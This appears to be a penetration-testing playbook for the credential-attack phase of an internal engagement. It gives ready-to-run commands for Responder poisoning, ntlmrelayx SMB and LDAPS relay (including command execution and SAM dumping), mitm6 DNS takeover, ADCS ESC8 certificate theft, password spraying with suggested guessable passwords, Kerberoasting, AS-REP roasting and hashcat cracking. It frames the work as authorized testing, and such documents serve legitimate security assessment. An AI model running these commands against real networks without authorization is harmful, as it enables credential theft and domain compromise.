# Phase 3: Credential Attacks & Initial Access

## Purpose
Credential harvesting via network poisoning, relay attacks, password spraying, and Kerberos attacks.

## When to Use
- Phase 3 of internal engagement
- User asks about Responder, relay attacks, password spraying, Kerberoasting
- Need to capture or crack credentials
- Starting from zero (no domain creds yet) or expanding access

---

## Phase 0 (Passive) vs Phase 3 (Active) — Key Distinction

Responder and mitm6 appear in both Phase 0 and Phase 3, but in very different modes:

| | Phase 0 (Passive) | Phase 3 (Active) |
|---|---|---|
| **Responder** | `-A` analyze mode — listen only, no poisoning | `-wrFP` — active LLMNR/NBT-NS/MDNS poisoning |
| **mitm6** | `--no-ra` — observe IPv6/DHCPv6, no spoofing | Active — DHCPv6 takeover + relay with ntlmrelayx |
| **Flamingo** | Passive credential capture (SSH, FTP, HTTP, SMB) | Not used (active tools more effective) |
| **tcpdump** | Baseline traffic capture | Not used |
| **Authorization** | Passive listening only — minimal ROE concern | Requires explicit written authorization |
| **Noise** | Zero | Significant |

**If you ran `passive-sniffing.sh` in Phase 0**, Responder `-A` is already capturing traffic patterns and may have caught credentials from misconfigured services. Review those captures before escalating to active poisoning here.

**Transitioning to active**: Stop the Phase 0 Responder analyze session before starting active poisoning (they bind to the same ports). Kill the passive session: `screen -S pentest-passive -X quit` or `zellij kill-session pentest-passive`.

---

## Workflow

### Step 1: LLMNR/NBT-NS Poisoning (Responder)

**What it does**: Responds to broadcast name resolution requests, capturing NTLMv2 hashes from systems attempting to reach non-existent resources.

```bash
# Create output directory
mkdir -p outputs/responder

# Identify your network interface
ip a

# Start Responder (recommended flags)
sudo responder -I [INTERFACE] -wrFP -v | tee outputs/responder/responder_$(date +%Y%m%d_%H%M%S).log
```

**Flags explained:**
- `-w` - Start WPAD rogue proxy
- `-r` - Answer NBT-NS queries for netbios wredir suffix
- `-F` - Force NTLM/Basic auth on WPAD
- `-P` - Force Basic auth for proxy
- `-v` - Verbose mode

**Let Responder run** for 30-60+ minutes during business hours for best results. Morning (9-10am) and after lunch are peak times.

**Retrieve captured hashes:**
```bash
# View all captured hashes
ls -la /usr/share/responder/logs/
cat /usr/share/responder/logs/NTLMv2-*.txt

# Copy to project
cp /usr/share/responder/logs/NTLMv2-*.txt outputs/responder/

# Count unique users captured
cat outputs/responder/NTLMv2-*.txt | cut -d: -f1 | sort -u
```

**Finding**: If hashes captured → HIGH finding (LLMNR/NBT-NS Poisoning)

---

### Step 2: SMB Relay Attacks

**Prerequisite**: Hosts with SMB signing disabled (from `targets/smb-no-signing.txt`)

```bash
# Verify relay targets exist
wc -l targets/smb-no-signing.txt

# Basic SMB relay (captures SAM hashes)
sudo ntlmrelayx.py -tf targets/smb-no-signing.txt -smb2support -of outputs/impacket/relay_hashes.txt

# Relay with command execution
sudo ntlmrelayx.py -tf targets/smb-no-signing.txt -smb2support -c 'whoami /all' 2>&1 | tee outputs/impacket/relay_exec.txt

# Relay to dump SAM
sudo ntlmrelayx.py -tf targets/smb-no-signing.txt -smb2support --dump-sam 2>&1 | tee outputs/impacket/relay_sam.txt

# Relay to enumerate shares
sudo ntlmrelayx.py -tf targets/smb-no-signing.txt -smb2support --enum-shares 2>&1 | tee outputs/impacket/relay_shares.txt
```

**Trigger authentication** (while relay is running):
- Wait for Responder captures (organic traffic)
- Or use `PetitPotam`, `PrinterBug`, `DFSCoerce` for targeted coercion

---

### Step 3: IPv6 DNS Takeover (mitm6)

**What it does**: Exploits IPv6 auto-configuration to become the DNS server, then relays captured authentication.

```bash
# Terminal 1: Start mitm6
sudo mitm6 -d [DOMAIN] --ignore-nofqdn

# Terminal 2: Start ntlmrelayx targeting LDAPS
sudo ntlmrelayx.py -6 -t ldaps://[DC_IP] --delegate-access -wh attacker-wpad 2>&1 | tee outputs/impacket/mitm6_relay.txt
```

**This creates machine accounts and sets up RBCD** — very powerful attack path.

**Finding**: If successful → HIGH finding (IPv6 DNS Takeover)

---

### Step 4: ADCS Relay (ESC8)

**Prerequisite**: Web enrollment endpoint discovered in Phase 2 ADCS enumeration.

```bash
# Relay to ADCS web enrollment
sudo ntlmrelayx.py -t http://[CA_IP]/certsrv/certfnsh.asp -smb2support --adcs --template DomainController 2>&1 | tee outputs/impacket/adcs_relay.txt

# If certificate obtained, authenticate with it
certipy auth -pfx [certificate.pfx] -dc-ip [DC_IP]
```

**Finding**: If successful → CRITICAL finding (ADCS ESC8 - NTLM Relay to Web Enrollment)

---

### Step 5: Password Spraying

**CRITICAL: Review password policy first!**

```bash
# Check password policy
netexec smb [DC_IP] -u '[USER]' -p '[PASS]' --pass-pol
```

Document before spraying:
- Lockout threshold: [X] attempts
- Observation window: [X] minutes
- Lockout duration: [X] minutes

**Spraying rules:**
1. One password per spray round
2. Wait for observation window between rounds
3. Stay under lockout threshold
4. Log everything with timestamps

```bash
# Create output directory
mkdir -p outputs/netexec

# Single password spray
netexec smb [DC_IP] -u targets/domain-users.txt -p 'Spring2026!' --continue-on-success 2>&1 | tee outputs/netexec/spray_$(date +%Y%m%d_%H%M%S).txt

# Common password patterns to try:
# [Season][Year][!]  → Spring2026!, Winter2025!
# [Company][123!]    → Client123!, ClientName1!
# [Month][Year]      → February2026, Jan2026!
# Welcome1!, Password1!, Changeme1!

# With hash (pass-the-hash spray)
netexec smb targets/live-hosts.txt -u '[USER]' -H [NTLM_HASH] --continue-on-success
```

**Finding**: If accounts cracked → HIGH finding (Weak Domain Passwords)

---

### Step 6: Kerberos Attacks

#### Kerberoasting
```bash
# Extract service ticket hashes (requires any domain cred)
impacket-GetUserSPNs -request -dc-ip [DC_IP] '[DOMAIN]/[USER]:[PASS]' -outputfile outputs/impacket/kerberoast_$(date +%Y%m%d_%H%M%S).txt

# View extracted SPNs
impacket-GetUserSPNs -dc-ip [DC_IP] '[DOMAIN]/[USER]:[PASS]'
```

#### AS-REP Roasting
```bash
# Find AS-REP roastable accounts (no preauth required)
impacket-GetNPUsers -dc-ip [DC_IP] '[DOMAIN]/' -usersfile targets/domain-users.txt -format hashcat -outputfile outputs/impacket/asrep_$(date +%Y%m%d_%H%M%S).txt

# With credentials (finds them automatically)
impacket-GetNPUsers -dc-ip [DC_IP] '[DOMAIN]/[USER]:[PASS]' -format hashcat -outputfile outputs/impacket/asrep.txt
```

**Finding**: Kerberoastable accounts → HIGH finding (especially if cracked)
**Finding**: AS-REP roastable accounts → MEDIUM-HIGH finding

---

### Step 7: Hash Cracking

```bash
# NTLMv2 (from Responder)
hashcat -m 5600 outputs/responder/NTLMv2-*.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule

# Kerberoast (TGS-REP)
hashcat -m 13100 outputs/impacket/kerberoast*.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule

# Kerberoast (AES256)
hashcat -m 19700 outputs/impacket/kerberoast*.txt /usr/share/wordlists/rockyou.txt

# AS-REP
hashcat -m 18200 outputs/impacket/asrep*.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule

# NTLM (from secretsdump)
hashcat -m 1000 outputs/impacket/ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# NTLMv1 (rare but devastating - rainbow tables)
hashcat -m 5500 outputs/responder/NTLMv1-*.txt /usr/share/wordlists/rockyou.txt

# Status check
hashcat --show -m 5600 outputs/responder/NTLMv2-*.txt
```

**Wordlist recommendations:**
1. `rockyou.txt` - Classic default
2. Custom wordlist with company name variations
3. `SecLists/Passwords/` collection
4. Previously cracked passwords as base

---

## Automation

Run the guided setup:
```bash
cd Scripts && ./credential-attacks.sh [INTERFACE] [DC_IP] [DOMAIN]
```

---

## Track Compromised Accounts

Update Notes.md with every compromised credential:

```markdown
## Compromised Accounts

| Username | Source | Hash/Password | Admin On |
|----------|--------|---------------|----------|
| jsmith | Responder NTLMv2 | P@ssw0rd! | WS01, WS02 |
| svc_backup | Kerberoast | Backup2024! | FILE01, DC01 |
```

---

## Deliverables

| File | Contents |
|------|----------|
| `outputs/responder/` | Captured NTLMv2 hashes |
| `outputs/impacket/kerberoast*.txt` | Kerberoast hashes |
| `outputs/impacket/asrep*.txt` | AS-REP hashes |
| `outputs/impacket/relay_*.txt` | Relay attack output |
| `outputs/netexec/spray_*.txt` | Password spray results |
| Updated Notes.md | Compromised accounts table |

---

## Transition to Phase 4

When complete:
1. Responder run during business hours (hashes captured or documented)
2. Relay attacks attempted (if SMB signing disabled)
3. Password spraying completed within policy limits
4. Kerberoast/AS-REP hashes extracted and cracking attempted
5. All compromised credentials documented

**Next**: Proceed to `Workflows/LateralMovement.md` (Phase 4)
